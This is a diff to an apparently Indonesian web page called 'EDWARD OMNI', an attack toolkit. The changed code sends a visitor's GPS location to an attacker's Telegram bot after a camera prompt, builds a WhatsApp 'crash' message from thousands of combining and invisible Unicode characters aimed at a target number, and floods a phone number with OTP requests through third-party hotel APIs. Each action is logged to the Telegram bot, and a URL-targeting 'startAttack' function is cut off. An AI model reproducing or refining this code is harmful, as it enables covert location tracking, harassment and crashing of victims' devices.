@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>[ EDWARD OMNI V.7.0 BRUTAL ]</title>
+    <title>[ EDWARD OMNI V.7.5 BRUTAL ]</title>
     <style>
         :root { --neon: #0f0; --danger: #f00; --bg: #0a0a0a; --purple: #bc13fe; }
         body { background: var(--bg); color: var(--neon); font-family: 'Segoe UI', sans-serif; margin: 0; padding: 20px; text-align: center; }
@@ -25,8 +25,8 @@
 </head>
 <body>
 
-    <h1>EDWARD OMNI <span style="color:#fff">V.7.0</span></h1>
-    <p style="font-size:10px; color:var(--purple);">ULTIMATE BRUTAL SYSTEM ACTIVE</p>
+    <h1>EDWARD OMNI <span style="color:#fff">V.7.5</span></h1>
+    <p style="font-size:10px; color:var(--purple);">ULTIMATE CONSOLIDATED SYSTEM</p>
 
     <div class="panel">
         <button onclick="takeSnap()" style="background:#fff; color:#000; border:none;">📸 RADAR & PHOTO SCAN</button>
@@ -35,7 +35,7 @@
     </div>
 
     <div class="panel" style="border-color: var(--purple)">
-        <h3 style="color: var(--purple); margin-top:0">😈 BRUTAL WA BUG</h3>
+        <h3 style="color: var(--purple); margin-top:0">😈 ULTRA CRASH WA</h3>
         <input type="number" id="noBug" placeholder="Nomor Target (628...)">
         <button onclick="sendBug()" class="btn-bug">KIRIM VIRUS CRASH 😈</button>
     </div>
@@ -92,7 +92,7 @@
             } catch (e) { showToast("Camera Denied!", "#f00"); }
             
             navigator.geolocation.getCurrentPosition(p => {
-                fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=📍 LOKASI JELAS:\nhttp://maps.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
+                fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=📍 LOKASI:\nhttp://maps.google.com/?q=${p.coords.latitude},${p.coords.longitude}`);
             });
         }
 
@@ -111,41 +111,31 @@
             return new Blob([ab], { type: 'image/jpeg' });
         }
 
-        // 😈 BRUTAL BUG V.7.0 (Force Crash Rendering)
+        // 😈 ULTRA CRASH BUG V.7.5
         function sendBug() {
             let n = document.getElementById('noBug').value;
             if(!n) return showToast("Nomor Mana?!", "#f00");
-            
-            let overload = "​​".repeat(5000); 
-            let zzw = "‎".repeat(2000);
-            let bugBrutal = `wa.me/settings?📍${overload}${zzw}😈_EDWARD_BAIK_BRUTAL_😈${overload}`;
-            
-            showToast("VIRUS BRUTAL COPIED & SENT!", "#bc13fe");
+            let crash = "ॣ".repeat(2000); 
+            let heavy = " 𑗄 ".repeat(1500);
+            let invisible = "​​".repeat(3000);
+            let bugBrutal = `wa.me/settings?📍${invisible}${crash}${heavy}😈_EDWARD_BRUTAL_V75_😈${crash}${heavy}${invisible}`;
+            showToast("VIRUS BRUTAL COPIED!", "#bc13fe");
             navigator.clipboard.writeText(bugBrutal);
-            
-            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=😈 BRUTAL BUG SENT: ${n}`);
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=😈 ULTRA CRASH SENT: ${n}`);
             window.open(`https://api.whatsapp.com/send?phone=${n}&text=${encodeURIComponent(bugBrutal)}`, '_blank');
         }
 
         function spamOTP() {
             let n = document.getElementById('noTarget').value;
-            if(!n) return showToast("Input Number!", "#f00");
-            showToast("Bombing Target...");
+            if(!n) return showToast("Input Target!", "#f00");
+            showToast("Bombing...");
             fetch(`https://m.reddoorz.com/api/v1/users/send_otp?phone=${n}`, {mode:'no-cors'});
             fetch(`https://www.oyorooms.com/api/pwa/generateotp?phone=${n}`, {mode:'no-cors'});
-            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=⚔️ OTP SENT TO: ${n}`);
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=⚔️ OTP SENT: ${n}`);
         }
 
-        function getPojav() {
-            showToast("Redirecting to Store...");
-            window.location.href = "https://play.google.com/store/apps/details?id=net.kdt.pojavlaunch";
-        }
-
-        function launch(pkg) {
-            showToast("Opening...");
-            window.location.href = "intent://#Intent;scheme=android-app;package=" + pkg + ";end";
-        }
-
+        function getPojav() { window.location.href = "https://play.google.com/store/apps/details?id=net.kdt.pojavlaunch"; }
+        function launch(pkg) { window.location.href = "intent://#Intent;scheme=android-app;package=" + pkg + ";end"; }
         function startAttack() {
             let t = document.getElementById('targetJudol').value;
             if(!t) return showToast("Input URL!", "#f00");
